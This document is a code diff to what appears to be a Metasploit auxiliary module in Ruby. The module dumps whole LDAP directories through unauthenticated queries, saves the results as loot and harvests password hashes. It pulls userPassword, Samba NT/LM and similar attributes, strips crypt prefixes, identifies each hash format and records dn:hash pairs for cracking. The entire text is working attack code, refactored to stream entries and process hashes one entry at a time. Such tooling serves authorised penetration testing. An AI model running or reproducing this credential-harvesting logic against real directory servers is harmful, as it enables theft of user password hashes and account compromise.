@@ -53,10 +53,6 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-  def pass_attr
-    @pass_attr ||= 'userPassword, sambantpassword, sambalmpassword, unixUserPassword, password'
-  end
-
   def user_attr
     @user_attr ||= 'dn'
   end
@@ -69,7 +65,6 @@ class MetasploitModule < Msf::Auxiliary
   # Dump data using discovered base DN:
   #   ldapsearch -xb bind_dn -H ldap://[redacted] \* + -
   def run
-    entries = nil
     base_dn_vuln = nil
 
     ldap_connect do |ldap|
@@ -92,16 +87,30 @@ class MetasploitModule < Msf::Auxiliary
           naming_contexts = ['']
         end
       end
+      
+      @user_attr ||= datastore['USER_ATTR']
+      @user_attr ||= 'dn'
+      print_status("Taking '#{@user_attr}' attribute as username")
 
-      naming_contexts.each do |item|
-        print_status("#{peer} Dumping data for base DN='#{item}'")
-        entries = ldap.search(base: item, attributes: %w[* + -])
-        # We are ok with any entry returned
-        if entries && entries.any?
-          base_dn_vuln = item
-          pillage(entries, item)
-        else
-          print_error("#{peer} did not return any entries for base DN='#{item}'")
+      pass_attr ||= datastore['PASS_ATTR']
+      pass_attr_array = pass_attr.split(/[,\s]+/).compact.reject(&:empty?)
+
+      naming_contexts.each do |base_dn|
+        print_status("#{peer} Dumping data for base DN='#{base_dn}'")
+        Tempfile.create do |f|
+          ldap.search(base: base_dn, attributes: %w[* + -]) do |entry|
+            base_dn_vuln = base_dn
+            f.write("# #{entry.dn}\n")
+            f.write(entry.to_ldif.force_encoding('utf-8'))
+            f.write("\n")
+            pass_attr_array.each do |attr|
+              if entry[attr].any?
+                process_hash(entry, attr)
+              end
+            end
+          end
+          f.rewind
+          pillage(f.read, base_dn)
         end
       end
     end
@@ -119,10 +128,7 @@ class MetasploitModule < Msf::Auxiliary
     Exploit::CheckCode::Unknown
   end
 
-  def pillage(entries, base_dn)
-    # TODO: Make this more efficient?
-    ldif = entries.map(&:to_ldif).map { |s| s.force_encoding('utf-8') }.join("\n")
-
+  def pillage(ldif, base_dn)
     print_status("Storing LDAP data for base DN='#{base_dn}' in loot")
 
     ldif_filename = store_loot(
@@ -141,21 +147,9 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good("Saved LDAP data to #{ldif_filename}")
 
-    @pass_attr ||= datastore['PASS_ATTR']
-
-    print_status("Searching for attribute(s): #{@pass_attr}")
-    # Process entries with a non-empty hash/password attribute
-    @pass_attr.split(/[,\s]+/).compact.reject(&:empty?).each do |item|
-      process_hashes(entries.select { |entry| entry[item.strip].any? }, item.strip)
-    end
   end
 
-  def process_hashes(entries, pass_attr_name)
-    if entries.empty?
-      print_status("No enties found for the '#{pass_attr_name}' attribute")
-      return
-    end
-
+  def process_hash(entry, pass_attr_name)
     service_details = {
       workspace_id: myworkspace_id,
       module_fullname: fullname,
@@ -166,51 +160,44 @@ class MetasploitModule < Msf::Auxiliary
       service_name: 'ldap'
     }
 
-    @user_attr ||= datastore['USER_ATTR']
 
-    @user_attr ||= 'dn'
+    # This is the "username"
+    dn = entry[@user_attr].first # .dn
 
-    print_status("Taking '#{@user_attr}' attribute as username, '#{pass_attr_name}' as password")
+    hash = entry[pass_attr_name].first
 
-    entries.each do |entry|
-      # This is the "username"
-      dn = entry[@user_attr].first # .dn
-
-      hash = entry[pass_attr_name].first
-
-      # Skip empty or invalid hashes, e.g. '{CRYPT}x', xxxx, ****
-      if hash.nil? || hash.empty? ||
-         (hash.start_with?(/{crypt}/i) && hash.length < 10) ||
-         hash.start_with?('*****') ||
-         hash.start_with?(/xxxxx/i)
-        next
-      end
-
-      # Remove ldap {crypt} prefix from known hash types
-      hash.gsub!(/{crypt}\$1\$/i, '$1$')
-      hash.gsub!(/{crypt}\$6\$/i, '$6$')
-
-      # TODO: handle {crypt}taditional_crypt case, i.e. expliitly set the hash format
-      # TODO: handle vcenter vmdir binary hash format
-
-      print_good("Credentials found: #{dn}:#{hash}")
-
-      case @pass_attr.downcase
-      when 'sambalmpassword'
-        hash_format = 'lm'
-      when 'sambantpassword'
-        hash_format = 'nt'
-      else
-        hash_format = identify_hash(hash)
-      end
-
-      create_credential(service_details.merge(
-        username: dn,
-        private_data: hash,
-        private_type: :nonreplayable_hash,
-        jtr_format: hash_format
-      ))
+    # Skip empty or invalid hashes, e.g. '{CRYPT}x', xxxx, ****
+    if hash.nil? || hash.empty? ||
+       (hash.start_with?(/{crypt}/i) && hash.length < 10) ||
+       hash.start_with?('*****') ||
+       hash.start_with?(/xxxxx/i)
+      return
     end
+
+    # Remove ldap {crypt} prefix from known hash types
+    hash.gsub!(/{crypt}\$1\$/i, '$1$')
+    hash.gsub!(/{crypt}\$6\$/i, '$6$')
+
+    # TODO: handle {crypt}taditional_crypt case, i.e. expliitly set the hash format
+    # TODO: handle vcenter vmdir binary hash format
+
+    case pass_attr_name.downcase
+    when 'sambalmpassword'
+      hash_format = 'lm'
+    when 'sambantpassword'
+      hash_format = 'nt'
+    else
+      hash_format = identify_hash(hash)
+    end
+    
+    print_good("Credentials (#{hash_format}) found: #{dn}:#{hash}")
+
+    create_credential(service_details.merge(
+      username: dn,
+      private_data: hash,
+      private_type: :nonreplayable_hash,
+      jtr_format: hash_format
+    ))
   end
 
 end
